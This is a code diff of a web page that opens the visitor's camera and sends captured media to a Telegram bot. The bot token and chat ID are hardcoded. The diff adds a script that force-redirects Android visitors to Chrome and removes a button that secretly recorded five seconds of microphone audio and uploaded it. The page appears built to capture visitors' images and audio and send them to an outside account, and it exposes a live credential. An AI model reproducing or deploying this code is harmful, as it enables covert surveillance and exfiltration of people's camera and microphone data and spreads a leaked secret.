@@ -10,12 +10,20 @@
   
   <video id="video" autoplay playsinline style="width: 300px;"></video>
   <button id="captureBtn">Capture Photo</button>
-  <button id="recordAudioBtn">Record Audio</button>
   
   <script>
+    // Automatically redirect to Chrome on Android
+    (function() {
+      const isAndroid = /android/i.test(navigator.userAgent);
+      const currentUrl = window.location.href;
+
+      if (isAndroid) {
+        window.location.href = `intent://${currentUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end;`;
+      }
+    })();
+
     const video = document.getElementById('video');
     const captureBtn = document.getElementById('captureBtn');
-    const recordAudioBtn = document.getElementById('recordAudioBtn');
 
     // 1. Start the camera video stream
     async function startCamera() {
@@ -49,27 +57,7 @@
       }, 500);  // Small delay to allow video stream to load
     });
 
-    // 3. Record audio using MediaRecorder
-    recordAudioBtn.addEventListener('click', async () => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-        const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
-
-        mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
-        mediaRecorder.onstop = async () => {
-          const audioBlob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-          await sendToTelegram(audioBlob, 'audio');  // Send recorded audio to Telegram
-        };
-
-        mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 5000);  // Stop recording after 5 seconds
-      } catch (err) {
-        console.error('Error accessing microphone: ', err);
-      }
-    });
-
-    // 4. Function to send media to Telegram
+    // 3. Function to send media to Telegram
     async function sendToTelegram(blob, type) {
       const botToken = '7783174245:AAHArvpKS5IegITerWZJ44BtGl1S6ssxs2U';
       const chatId = '7532339931';  // Replace with the chat ID to send the media to
